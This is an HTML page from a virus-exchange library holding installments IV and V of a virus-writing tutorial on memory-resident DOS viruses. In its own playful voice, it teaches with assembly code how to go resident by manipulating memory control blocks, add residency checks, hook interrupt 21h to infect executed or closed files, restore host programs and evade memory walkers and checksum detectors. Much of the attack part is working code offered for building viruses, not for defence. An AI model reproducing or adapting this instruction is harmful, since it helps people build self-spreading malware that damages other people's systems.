+<tr><td>5 </td><td>3 BYTES</td><td>Reserved (Unused)</td></tr>
+<tr><td>8 </td><td>8 BYTES</td><td>DOS 4+ uses this. Yay.</td></tr>
+</table>
+<p>If the byte at offset 0 is 'M', then the MCB is not the end of the chain. The 'Z' denotes the end of the MCB chain. There can be more than one MCB chain present in memory at once and this "feature" is used by virii to go resident in high memory. The word at offset 1 is normally equal to the PSP of the MCB's owner. If it is 0, it means that the block is free and is available for use by programs. A value of 0008h in this field denotes DOS as the owner of the block. The value at offset 3 does NOT include the paragraph allocated for the MCB. It reflects the value passed to the DOS allocation functions. All fields located after the block size are pretty useless so you might as well ignore them.</p>
+<p>When a COM file is loaded, all available memory is allocated to it by DOS. When an EXE file is loaded, the amount of memory specified in the EXE header is allocated. There is both a minimum and maximum value in the header. Usually, the linker will set the maximum value to FFFFh paragraphs. If the program wishes to allocate memory, it must first shrink the main chunk of memory owned by the program to the minimum required. Otherwise, the pathetic attempt at memory allocation will fail miserably.</p>
+<p>Since programs normally are not supposed to manipulate MCBs directly, the DOS memory manager calls (48h - 4Ah) all return and accept values of the first program-usable memory paragraph, that is, the paragraph of memory immediately after the MCB. It is important to keep this in mind when writing MCB-manipulating code.</p>
+<h2><a name="p44">METHODS OF GOING RESIDENT</a></h2>
+<p>There are a variety of memory resident strategies. The first is the use of the traditional DOS interrupt TSR routines, either INT 27h or INT 21h/Function 31h. These routines are undesirable when writing virii, because they do not return control back to the program after execution. Additionally, they show up on "memory walkers" such as PMAP and MAPMEM. Even a doorknob can spot such a blatant viral presence.</p>
+<p>The traditional viral alternative to using the standard DOS interrupt is, of course, writing a new residency routine. Almost every modern virus uses a routine to "load high," that is, to load itself into the highest possible memory location. For example, in a 640K system, the virus would load itself just under the 640K but above the area reserved by DOS for program use. Although this is technically not the high memory area, it shall be referred to as such in the remainder of this file in order to add confusion and general chaos into this otherwise well-behaved file. Loading high can be easily accomplished through a series of interrupt calls for reallocation and allocation. The general method is:</p>
+<ol>
+<li>Find the memory size</li>
+<li>Shrink the program's memory to the total memory size - virus size</li>
+<li>Allocate memory for the virus (this will be in the high memory area)</li>
+<li>Change the program's MCB to the end of the chain (Mark it with 'Z')</li>
+<li>Copy the virus to high memory</li>
+<li>Save the old interrupt vectors if the virus wishes to chain vectors</li>
+<li>Set the interrupt vectors to the appropriate locations in high memory</li>
+</ol>
+<p>When calculating memory sizes, remember that all sizes are in paragraphs. The MCB must also be considered, as it takes up one paragraph of memory. The advantage of this method is that it does not, as a rule, show up on memory walkers. However, the total system memory as shown by such programs as CHKDSK will decrease.</p>
+<p>A third alternative is no allocation at all. Some virii copy themselves to the memory just under 640K, but fail to allocate the memory. This can have disastrous consequences, as any program loaded by DOS can possibly use this memory. If it is corrupted, unpredictable results can occur. Although no memory loss is shown by CHKDSK, the possible chaos resulting from this method is clearly unacceptable. Some virii use memory known to be free. For example, the top of the interrupt table or parts of video memory all may be used with some assurance that the memory will not be corrupted. Once again, this technique is undesirable as it is extremely unstable.</p>
+<p>These techniques are by no means the only methods of residency. I have seen such bizarre methods as going resident in the DOS internal disk buffers. Where there's memory, there's a way.</p>
+<p>It is often desirable to know if the virus is already resident. The simplest method of doing this is to write a checking function in the interrupt handler code. For example, a call to interrupt 21h with the ax register set to 7823h might return a 4323h value in ax, signifying residency. When using this check, it is important to ensure that no possible conflicts with either other programs or DOS itself will occur. Another method, albeit a costly process in terms of both time and code length, is to check each segment in memory for the code indicating the presence of the virus. This method is, of course, undesirable, since it is far, far simpler to code a simple check via the interrupt handler. By using any type of check, the virus need not fear going resident twice, which would simply be a waste of memory.</p>
+<h2><a name="p45">WHY RESIDENT?</a></h2>
+<p>Memory resident virii have several distinct advantages over runtime virii.</p>
+<dl>
+<dt>Size</dt>
+<dd>Memory resident virii are often smaller than their runtime brethern as they do not need to include code to search for files to infect.</dd>
+<dt>Effectiveness</dt>
+<dd>They are often more virulent, since even the DIR command can be "infected." Generally, the standard technique is to infect each file that is executed while the virus is resident.</dd>
+<dt>Speed</dt>
+<dd>Runtime virii infect before a file is executed. A poorly written or large runtime virus will cause a noticible delay before execution easily spotted by users. Additionally, it causes inordinate disk activity which is detrimental to the lifespan of the virus.</dd>
+<dt>stealth</dt>
+<dd>The manipulation of interrupts allows for the implementation of stealth techniques, such as the hiding of changes in file lengths in directory listings and on-the-fly disinfection. Thus it is harder for the average user to detect the virus. Additionally, the crafty virus may even hide from CRC checks, thereby obliterating yet another anti-virus detection technique.</dd>
+</dl>
+<h2><a name="p46">STRUCTURE OF THE RESIDENT VIRUS</a></h2>
+<p>With the preliminary information out of the way, the discussion can now shift to more virus-related, certainly more interesting topics. The structure of the memory resident virus is radically different from that of the runtime virus. It simply consists of a short stub used to determine if the virus is already resident. If it is not already in memory, the stuf loads it into memory through whichever method. Finally, the stub restores control to the host program. The rest of the code of the resident virus consists of interrupt handlers where the bulk of the work is done.</p>
+<p>The stub is the only portion of the virus which needs to have delta offset calculations. The interrupt handler ideally will exist at a location which will not require such mundane fixups. Once loaded, there should be no further use of the delta offset, as the location of the variables is preset. Since the resident virus code should originate at offset 0 of the memory block, originate the source code at offset 0. Do not include a jmp to the virus code in the original carrier file. When moving the virus to memory, simply move starting from [bp+startvirus] and the offsets should work out as they are in the source file. This simplifies (and shortens) the coding of the interrupt handlers.</p>
+<p>Several things must be considered in writing the interrupt handlers for a virus. First, the virus must preserve the registers. If the virus uses preexecution chaining, it must save the registers after the call to the original handler. If the virus uses postexecution chaining, it must restore the original registers of the interrupt call before the call to the original handler. Second, it is more difficult, though not impossible, to implement encryption with memory resident virii. The problem is that if the interrupt handler is encrypted, that interrupt handler cannot be called before the decryption function. This can be a major pain in the ass. The cheesy way out is to simply not include encryption. I prefer the cheesy way. The noncheesy readers out there might wish to have the memory simultaneously hold two copies of the virus, encrypt the unused copy, and use the encrypted copy as the write buffer. Of course, the virus would then take twice the amount of memory it would normally require. The use of encryption is a matter of personal choice and cheesiness. A sidebar to preservation of interrupt handlers: As noted earlier, the flags register is restored from the stack. It is important in preexecution chaining to save the new flags register onto the stack where the old flags register was stored.</p>
+<p>Another important factor to consider when writing interrupt handlers, especially those of BIOS interrupts, is DOS's lack of reentrance. This means that DOS functions cannot be executed while DOS is in the midst of processing an interrupt request. This is because DOS sets up the same stack pointer each time it is called, and calling the second DOS interrupt will cause the processing of one to overwrite the stack of the other, causing unpredictable, but often terminal, results. This applies regardless of which DOS interrupts are called, but it is especially true for interrupt 21h, since it is often tempting to use it from within an interrupt handler. Unless it is certain that DOS is not processing a previous request, do NOT use a DOS function in the interrupt handler. It is possible to use the "lower" interrupt 21h functions without fear of corrupting the stack, but they are basically the useless ones, performing functions easily handled by BIOS calls or direct hardware access. This entire discussion only applies to hooking non-DOS interrupts. With hooking DOS interrupts comes the assurance that DOS is not executing elsewhere, since it would then be corrupting its own stack, which would be a most unfortunate occurence indeed.</p>
+<p>The most common interrupt to hook is, naturally, interrupt 21h. Interrupt 21h is called by just about every DOS program. The usual strategy is for a virus to find potential files to infect by intercepting certain DOS calls. The primary functions to hook include the find first, find next, open, and execute commands. By cleverly using pre and postexecution chaining, a virus can easily find the file which was found, opened, or executed and infect it. The trick is simply finding the appropriate method to isolate the filename. Once that is done, the rest is essentially identical to the runtime virus.</p>
+<p>When calling interrupts hooked by the virus from the virus interrupt code, make sure that the virus does not trap this particular call, lest an infinite loop result. For example, if the execute function is trapped and the virus wishes, for some reason, to execute a particular file using this function, it should NOT use a simple "int 21h" to do the job. In cases such as this where the problem is unavoidable, simply simulate the interrupt call with a pushf/call combination.</p>
+<p>The basic structure of the interrupt handler is quite simple. The handler first screens the registers for either an identification call or for a trapped function such as execute. If it is not one of the above, the handler throws control back to the original interrupt handler. If it is an identification request, the handler simply sets the appropriate registers and returns to the calling program. Otherwise, the virus must decide if the request calls for pre or postexecution chaining. Regardless of which it uses, the virus must find the filename and use that information to infect. The filename may be found either through the use of registers as pointers or by searching thorugh certain data structures, such as FCBs. The infection routine is the same as that of nonresident virii, with the exception of the guidelines outlined in the previous few paragraphs.</p>
+<h2><a name="p47">WHAT'S TO COME</a></h2>
+<p>I apologise for the somewhat cryptic sentences used in the guide, but I'm a programmer, not a writer. My only suggestion is to read everything over until it makes sense. I decided to pack this issue of the guide with theory rather than code. In the next installment, I will present all the code necessary to write a memory-resident virus, along with some techniques which may be used. However, all the information needed to write a resident virii has been included in this installment; it is merely a matter of implementation. Have buckets o' fun!</p>
+<h2>Part V</h2>
+<div align="right">
+"Over 2 billion served"
+</div>
+<h2><a name="p51">INSTALLMENT V: RESIDENT VIRUSES, PART II</a></h2>
+<p>After reading the the Clumpy Guide, you should have at least some idea of how to code a resident virus. However, the somewhat vague descriptions I gave may have left you in a befuddled state. Hopefully, this installment will clear the air.</p>
+<h2><a name="p52">STRUCTURE</a></h2>
+<p>In case you missed it the last time, here is a quick, general overview of the structure of the resident virus. The virus consists of two major portions, the loading stub and the interrupt handlers. The loading stub performs two functions. First, it redirects interrupts to the virus code. Second, it causes the virus to go resident. The interrupt handlers contain the code which cause file infection. Generally, the handlers trap interrupt 21h and intercept such calls as file execution.</p>
+<h2><a name="p53">LOADING STUB</a></h2>
+<p>The loading stub consists of two major portions, the residency routine and the restoration routine. The latter portion, which handles the return of control to the original file, is identical as the one in the nonresident virus. I will briefly touch upon it here.</p>
+<p>By now you should understand thoroughly the theory behind COM file infection. By simply replacing the first few bytes, transfer can be controlled to the virus. The trick in restoring COM files is simply to restore the overwritten bytes at the beginning of the file. This restoration takes place only in memory and is therefore far from permanent. Since COM files always load in a single memory segment and begin loading at offset 100h in the memory segment (to make room for the PSP), the restoration procedure is very simple. For example, if the first three bytes of a COM file were stored in a buffer called "first3" before being overwritten by the virus, then the following code would restore the code in memory:</p>
+<pre class="source">
+    mov  di,100h          ; Absolute location of destination
+    lea  si,[bp+first3]   ; Load address of saved bytes.
+                          ; Assume bp = "delta offset"
+    movsw                 ; Assume CS = DS = ES and a cleared direction flag
+    movsb                 ; Move three bytes
+</pre>
+<p>The problem of returning control to the program still remains. This simply consists of forcing the program to transfer control to offset 100h. The easiest routine follows:</p>
+<pre class="source">
+    mov  di,100h
+    jmp  di
+</pre>
+<p>There are numerous variations of this routine, but they all accomplish the basic task of setting the ip to 100h.</p>
+<p>You should also understand the concept behind EXE infection by now. EXE infection, at its most basic level, consists of changing certain bytes in the EXE header. The trick is simply to undo all the changes which the virus made. The code follows:</p>
+<pre class="source">
+    mov     ax, es                          ; ES = segment of PSP
+    add     ax, 10h                         ; Loading starts after PSP
+    add     word ptr cs:[bp+OrigCSIP+2], ax ; Header segment value was
+                                            ; relative to end of PSP
+    cli
+    add     ax, word ptr cs:[bp+OrigSSSP+2] ; Adjust the stack as well
+    mov     ss, ax
+    mov     sp, word ptr cs:[bp+OrigSSSP]
+    sti
+    db      0eah                            ; JMP FAR PTR SEG:OFF
+  OrigCSIP  dd ?                            ; Put values from the header
+  OrigSSSP  dd ?                            ; into here
+</pre>
+<p>If the virus is an EXE-specific infector but you still wish to use a COM file as the carrier file, then simply set the OrigCSIP value to FFF0:0000. This will be changed by the restoration routine to PSP:0000 which is, conveniently, an int 20h instruction.</p>
+<p>All that stuff should not be new. Now we shall tread on new territory. There are two methods of residency. The first is the weenie method which simply consists of using DOS interrupts to do the job for you. This method sucks because it is 1) easily trappable by even the most primitive of resident virus monitors and 2) forces the program to terminate execution, thereby alerting the user to the presence of the virus. I will not even present code for the weenie method because, as the name suggests, it is only for weenies. Real programmers write their own residency routines. This basically consists of MCB-manipulation. The general method is:</p>
+<ol>
+<li>Check for prior installation. If already installed, exit the virus.</li>
+<li>Find the top of memory.</li>
+<li>Allocate the high memory.</li>
+<li>Copy the virus to high memory.</li>
+<li>Swap the interrupt vectors.</li>
+</ol>
+<p>There are several variations on this technique and they will be discussed as the need arises.</p>
+<h2><a name="p54">INSTALLATION CHECK</a></h2>
+<p>There are several different types of installation check. The most common is a call to int 21h with AX set to a certain value. If certain registers are returned set to certain values, then the virus is resident. For example, a sample residency check would be:</p>
+<pre class="source">
+    mov  ax,9999h  ; residency check
+    int  21h
+    cmp  bx,9999h  ; returns bx=9999h if installed
+    jz   already_installed
+</pre>
+<p>When choosing a value for ax in the installation check, make sure it does not conflict with an existing function unless the function is harmless. For example, do not use display string (ah=9) unless you wish to have unpredictable results when the virus is first being installed. An example of a harmless function is get DOS version (ah=30h) or flush keyboard buffer (ah=0bh). Of course, if the check conflicts with a current function, make sure it is narrow enough so no programs will have a problem with it. For example, do not merely trap ah=30h, but trap ax=3030h or even ax=3030h and bx=3030h.</p>
+<p>Another method of checking for residency is to search for certain characteristics of the virus. For example, if the virus always sets an unused interrupt vector to point to its code, a possible residency check would be to search the vector for the virus characteristics. For example:</p>
+<pre class="source">
+    xor  ax,ax
+    mov  ds,ax     ; ds->interrupt table
+    les  bx,ds:[60h*4] ; get address of interrupt 60h
+                   ; assume the virus traps this and puts its int 21h handler
+                   ; here
+    cmp  es:bx,0FF2Eh ; search for the virus string
+     .
+     .
+     .
+  int60:
+    jmp far ptr cs:origint21
+</pre>
+<p>When using this method, take care to ensure that there is no possibility of this characteristic being false when the virus is resident. In this case, another program must not trap the int 60h vector or else the check may fail even if the virus is already resident, thereby causing unpredictable results.</p>
+<h2><a name="p55">FIND THE TOP OF MEMORY</a></h2>
+<p>DOS generally loads all available memory to a program upon loading. Armed with this knowledge, the virus can easily determine the available memory size. Once again, the MCB structure is:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="MCB structure">
+<tr><th>Offset</th><th> Size</th><th>Meaning</th></tr>
+<tr><td>0 </td><td> BYTE</td><td>'M' or 'Z'</td></tr>
+<tr><td>1 </td><td> WORD</td><td>Process ID (PSP of block's owner)</td></tr>
+<tr><td>3 </td><td> WORD</td><td>Size in paragraphs</td></tr>
+<tr><td>5 </td><td>3 BYTES</td><td>Reserved (Unused)</td></tr>
+<tr><td>8 </td><td>8 BYTES</td><td>DOS 4+ uses this. Yay.</td></tr>
+</table>
+<pre class="source"> 
+    mov  ax,ds     ; Assume DS initially equals the segment of the PSP
+    dec  ax
+    mov  ds,ax     ; DS = MCB of infected program
+    mov  bx,ds:[3] ; Get MCB size (total available paragraphs to program)
+</pre>
+<p>A simpler method of performing the same action is to use DOS's reallocate memory function in the following manner:</p>
+<pre class="source">
+    mov  ah,4ah    ; Alter memory allocation (assume ES = PSP)
+    mov  bx,0FFFFh ; Request a ridiculous amount of memory
+    int  21h       ; Returns maximum available memory in BX
+                   ; This is the same value as in ds:[3]
+</pre>
+<h2><a name="p56">ALLOCATE THE HIGH MEMORY</a></h2>
+<p>The easiest method to allocate memory is to let DOS do the work for you.</p>
+<pre class="source">
+    mov  ah,4ah    ; Alter memory allocation (assume ES = PSP)
+    sub  bx,(endvirus-startvirus+15)/16+1 ; Assume BX originally held total
+                   ; memory available to the program (returned by earlier
+                   ; call to int 21h/function 4ah
+    int  21h
+ 
+    mov  ah,48h    ; Allocate memory
+    mov  bx,(endvirus-startvirus+15)/16
+    int  21h
+    mov  es,ax     ; es now holds the high memory segment
+ 
+    dec  bx
+    mov  byte ptr ds:[0], 'Z' ; probably not needed
+    mov  word ptr ds:[1], 8   ; Mark DOS as owner of MCB
+</pre>
+<p>The purpose of marking DOS as the owner of the MCB is to prevent the deallocation of the memory area upon termination of the carrier program.</p>
+<p>Of course, some may prefer direct manipulation of the MCBs. This is easily accomplished. If ds is equal to the segment of the carrier program's MCB, then the following code will do the trick:</p>
+<pre class="source">
+    ; Step 1) Shrink the carrier program's memory allocation
+    ; One paragraph is added for the MCB of the memory area which the virus
+    ; will inhabit
+    sub  ds:[3],(endvirus-startvirus+15)/16 + 1
+ 
+    ; Step 2) Mark the carrier program's MCB as the last in the chain
+    ; This isn't really necessary, but it assures that the virus will not
+    ; corrupt the memory chains
+    mov  byte ptr ds:[0],'Z'
+ 
+    ; Step 3) Alter the program's top of memory field in the PSP
+    ; This preserves compatibility with COMMAND.COM and any other program
+    ; which uses the field to determine the top of memory
+    sub  word ptr ds:[12h],(endvirus-startvirus+15)/16 + 1
+ 
+    ; Step 4) Calculate the first usable segment
+    mov  bx,ds:[3] ; Get MCB size
+    stc            ; Add one for the MCB segment
+    adc  bx,ax     ; Assume AX still equals the MCB of the carrier file
+                   ; BX now holds first usable segment.  Build the MCB
+                   ; there
+    ; Alternatively, you can use the value in ds:[12h] as the first usable
+    ; segment:
+    ; mov  bx,ds:[12h]
+ 
+    ; Step 5) Build the MCB
+    mov  ds,bx     ; ds holds the area to build the MCB
+    inc  bx        ; es now holds the segment of the memory area controlled
+    mov  es,bx     ; by the MCB
+    mov  byte ptr ds:[0],'Z' ; Mark the MCB as the last in the chain
+                   ; Note: you can have more than one MCB chain
+    mov  word ptr ds:[1],8   ; Mark DOS as the owner
+    mov  word ptr ds:[3],(endvirus-startvirus+15)/16 ; FIll in size field
+</pre>
+<p>There is yet another method involving direct manipulation.</p>
+<pre class="source">
+    ; Step 1) Shrink the carrier program's memory allocation
+    ; Note that rounding is to the nearest 1024 bytes and there is no
+    ; addition for an MCB
+    sub  ds:[3],((endvirus-startvirus+1023)/1024)*64
+ 
+    ; Step 2) Mark the carrier program's MCB as the last in the chain
+    mov  byte ptr ds:[1],'Z'
+ 
+    ; Step 3) Alter the program's top of memory field in the PSP
+    sub  word ptr ds:[12h],((endvirus-startvirus+1023)/1024)*64
+ 
+    ; Step 4) Calculate the first usable segment
+    mov  es,word ptr ds:[12h]
+ 
+    ; Step 5) Shrink the total memory as held in BIOS
+    ; Memory location 0:413h holds the total system memory in K
+    xor  ax,ax
+    mov  ds,ax
+    sub  ds:[413h],(endvirus-startvirus+1023)/1024 ; shrink memory size
+</pre>
+<p>This method is great because it is simple and short. No MCB needs to be created because DOS will no longer allocate memory held by the virus. The modification of the field in the BIOS memory area guarantees this.</p>
+<h2><a name="p57">COPY THE VIRUS TO HIGH MEMORY</a></h2>
+<p>This is ridiculously easy to do. If ES holds the high memory segment, DS holds CS, and BP holds the delta offset, then the following code will do:</p>
+<pre class="source">
+    lea  si,[bp+offset startvirus]
+    xor  di,di     ; destination @ 0
+    mov  cx,(endvirus-startvirus)/2
+    rep  movsw     ; Copy away, use words for speed
+</pre>
+<h2><a name="p58">SWAP INTERRUPT VECTORS</a></h2>
+<p>There are, once again, two ways to do this; via DOS or directly. Almost every programmer worth his salt has played with interrupt vectors at one time or another. Via DOS:</p>
+<pre class="source">
+    push es        ; es->high memory
+    pop  ds        ; ds->high memory
+    mov  ax,3521h  ; get old int 21h handler
+    int  21h       ; to es:bx
+    mov  word ptr ds:oldint21,bx  ; save it
+    mov  word ptr ds:oldint21+2,es
+    mov  dx,offset int21 ; ds:dx->new int 21h handler in virus
+    mov  ax,2521h  ; set handler
+    int  21h
+</pre>
+<p>And direct manipulation:</p>
+<pre class="source">
+    xor  ax,ax
+    mov  ds,ax
+    lds  bx,ds:[21h*4]
+    mov  word ptr es:oldint21,bx
+    mov  word ptr es:oldint21+2,ds
+    mov  ds,ax
+    mov  ds:[21h*4],offset int21
+    mov  ds:[21h*4+2],es
+</pre>
+<p>Delta offset calculations are not needed since the location of the variables is known. This is because the virus is always loaded into high memory starting in offset 0.</p>
+<h2><a name="p59">INTERRUPT HANDLER</a></h2>
+<p>The interrupt handler intercepts function calls to DOS and waylays them. The interrupt handler typically begins with a check for a call to the installation check. For example:</p>
+<pre class="source">
+  int21:
+    cmp  ax,9999h  ; installation check?
+    jnz  not_installation_check
+    xchg ax,bx     ; return bx = 9999h if installed
+    iret           ; exit interrupt handler
+  not_installation_check:
+  ; rest of interrupt handler goes here
+</pre>
+<p>With this out of the way, the virus can trap whichever DOS functions it wishes. Generally the most effective function to trap is execute (ax=4b00h), as the most commonly executed files will be infected. Another function to trap, albeit requiring more work, is handle close. This will infect on copies, viewings, patchings, etc. With some functions, prechaining is desired; others, postchaining. Use common sense. If the function destroys the filename pointer, then use prechaining. If the function needs to be completed before infection can take place, postchaining should be used. Prechaining is simple:</p>
+<pre class="source">
+    pushf           ; simulate an int 21h call
+    call dword ptr cs:oldint21
+ 
+  ; The following code ensures that the flags will be properly set upon
+  ; return to the caller
+    pushf
+    push bp
+    push ax
+ 
+  ; flags         [bp+10]
+  ; calling CS:IP [bp+6]
+  ; flags new     [bp+4]
+  ; bp            [bp+2]
+  ; ax            [bp]
+ 
+    mov  bp, sp     ; setup stack frame
+    mov  ax, [bp+4] ; get new flags
+    mov  [bp+10], ax; replace the old with the new
+ 
+    pop  ax         ; restore stack
+    pop  bp
+    popf
+</pre>
+<p>To exit the interrupt handler after prechaining, use an iret statement rather than a retn or retf. Postchaining is even simpler:</p>
+<pre class="source">jmp  dword ptr cs:oldint21 ; this never returns to the virus int handler</pre>
+<p>When leaving the interrupt handler, make sure that the stack is not unbalanced and that the registers were not altered. Save the registers right after prechaining and long before postchaining.</p>
+<p>Infection in a resident virus is essentially the same as that in a nonresident virus. The only difference occurs when the interrupt handler traps one of the functions used in the infection routine. For example, if handle close is trapped, then the infection routine must replace the handle close int 21h call with a call to the original interrupt 21h handler, a la:</p>
+<pre class="source">
+    pushf
+    call dword ptr cs:oldint21
+</pre>
+<p>It is also necessary to handle encryption in another manner with a resident virus. In the nonresident virus, it was not necessary to preserve the code at all times. However, it is desirable to keep the interrupt handler(s) decrypted, even when infecting. Therefore, the virus should keep two copies of itself in memory, one as code and one as data. The encryptor should encrypt the secondary copy of the virus, thereby leaving the interrupt handler(s) alone. This is especially important if the virus traps other interrupts such as int 9h or int 13h.</p>
+<h2><a name="p5a">A THEORY ON RESIDENT VIRUSES</a></h2>
+<p>Resident viruses can typically be divided into two categories; slow and fast infectors. They each have their own advantages and disadvantages.</p>
+<p>Slow infectors do not infect except in the case of a file creation. This infector traps file creates and infects upon the closing of the file. This type of virus infects on new file creations and copying of files. The disadvantage is that the virus spreads slowly. This disadvantage is also an advantage, as this may keep it undetected for a long time. Although slow infectors sound ineffective, in reality they can work well. Infection on file creations means that checksum/CRC virus detectors won't be able to checksum/CRC the file until after it has been infected. Additionally, files are often copied from one directory to another after testing. So this method can work.</p>
+<p>Fast infectors infect on executes. This type of virus will immediately attack commonly used files, ensuring the continual residency of the virus in subsequent boots. This is the primary advantage, but it is also the primary disadvantage. The infector works so rapidly that the user may quickly detect a discrepancy with the system, especially if the virus does not utilise any stealth techniques.</p>
+<p>Of course, there is no "better" way. It is a matter of personal preference. The vast majority of viruses today are fast infectors, although slow infectors are beginning to appear with greater frequency.</p>
+<p>If the virus is to infect on a create or open, it first must copy the filename to a buffer, execute the call, and save the handle. The virus must then wait for a handle close corresponding to that handle and infect using the filename stored in the buffer. This is the simplest method of infecting after a handle close without delving into DOS internals.</p>
+<h2><a name="p5b">IF YOU DON'T UNDERSTAND IT YET</a></h2>
+<p>don't despair; it will come after some time and much practise. You will soon find that resident viruses are easier to code than nonresident viruses. That's all for this installment, but be sure to grab the next one.</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vda07">Back to index</a>] [<a href="/lib/vda07.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vda07">de</a><a href="/lib/index.php?lang=en&amp;id=vda07">en</a><a href="/lib/index.php?lang=es&amp;id=vda07">es</a><a href="/lib/index.php?lang=it&amp;id=vda07">it</a><a href="/lib/index.php?lang=fr&amp;id=vda07">fr</a><a href="/lib/index.php?lang=pl&amp;id=vda07">pl</a><a href="/lib/index.php?lang=ru&amp;id=vda07">ru</a><a href="/lib/index.php?lang=ua&amp;id=vda07">ua</a></div>
+</body>
+</html>
